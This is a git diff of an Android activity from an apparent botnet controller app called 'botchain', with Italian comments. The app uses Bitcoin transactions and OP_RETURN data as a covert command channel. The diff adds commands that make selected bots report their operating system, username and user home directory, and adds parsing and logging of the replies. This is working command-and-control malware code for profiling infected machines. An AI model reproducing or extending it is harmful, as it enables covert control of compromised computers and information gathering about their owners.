@@ -11,6 +11,7 @@ import android.view.View;
 import android.widget.AdapterView;
 import android.widget.Button;
 import android.widget.ListView;
+import android.widget.Toast;
 
 import com.example.tonipagliaro.botchain.Adapter.BotListAdapter;
 
@@ -32,7 +33,6 @@ public class BotListActivity extends AppCompatActivity {
     BotListAdapter listaBotAdapter;
 
     ArrayList<String> indirizzi=new ArrayList<String>();
-    static ArrayList<String> indirizziAttivi=new ArrayList<String>();
 
     ListView listView;
     Button buttonRefresh;
@@ -46,7 +46,6 @@ public class BotListActivity extends AppCompatActivity {
         appState = (ApplicationState) getApplication();
 
         listView = (ListView) this.findViewById(R.id.listView_bot);
-
 
         for(String s : appState.mappaIndirizzi.keySet()){
             indirizzi.add(s+"-"+appState.mappaIndirizzi.get(s));
@@ -63,9 +62,30 @@ public class BotListActivity extends AppCompatActivity {
                         .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
                             public void onClick(DialogInterface dialog, int which) {
                                 try {
-                                    //Per il momento lo manda aanche se il bot ha i soldi.........
-                                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
-                                            new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
+                                    ListView lw = ((AlertDialog)dialog).getListView();
+                                    Log.d("App", lw.getItemAtPosition(which).toString());
+                                    String command = lw.getItemAtPosition(which).toString();
+                                    switch (command) {
+                                        case("Get OS"):
+                                            //Per il momento lo manda aanche se il bot ha i soldi.........
+                                            appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
+                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
+                                            break;
+                                        case("Get Username"):
+                                            //Per il momento lo manda aanche se il bot ha i soldi.........
+                                            appState.sendCommand("username-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
+                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
+                                            break;
+                                        case("Get User Home"):
+                                            //Per il momento lo manda aanche se il bot ha i soldi.........
+                                            appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
+                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
+                                            break;
+
+                                        default:
+                                            break;
+                                    }
+
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }
@@ -129,26 +149,29 @@ public class BotListActivity extends AppCompatActivity {
 
                     Log.d("App","address:"+addressString);
 
-                    //Da modificare
-                    if(comando.equalsIgnoreCase("ping_ok")) {
-
-                        //updateIndirizziAttivi(indirizziAttivi, addressString);
-                        //setMappaIndirizzi(indirizziAttivi);
-
-                        //Imposta lo stato del bot che mi ha risposto in "ok"
-                        setOkBot(addressString);
-
-                        for(String s : appState.mappaIndirizzi.keySet()){
-                            Log.d("App","indirizzo "+s +" valore "+appState.mappaIndirizzi.get(s));
-                        }
-
+                    switch (comando) {
+                        case("os"):
+                            String os = v[2];
+                            Log.d("App", "SISTEMA OPERATIV BOT: "+os);
+                            break;
+                        case("ping_ok"):
+                            setOkBot(addressString);
+                            for(String s : appState.mappaIndirizzi.keySet()){
+                                Log.d("App","indirizzo "+s +" valore "+appState.mappaIndirizzi.get(s));
+                            }
+                            break;
+                        case("username"):
+                            String username = v[2];
+                            Log.d("App", "SISTEMA OPERATIV BOT: " + username);
+                            break;
+                        case("userhome"):
+                            String userhome = v[2];
+                            Log.d("App", "SISTEMA OPERATIV BOT: "+userhome);
+                            break;
+                        default:
+                            break;
                     }
 
-
-                    for(String s : indirizziAttivi)
-                        Log.d("App","indirizzo attivo   "+s);
-
-                    //listView.setAdapter(listaBotAdapter);
 
 
                 } catch (Exception e) {
@@ -210,9 +233,7 @@ public class BotListActivity extends AppCompatActivity {
 
                 mess = new String(message);
                 Log.d("App", "Op_return   " + mess);
-
             }
-
 
         }
         return mess;
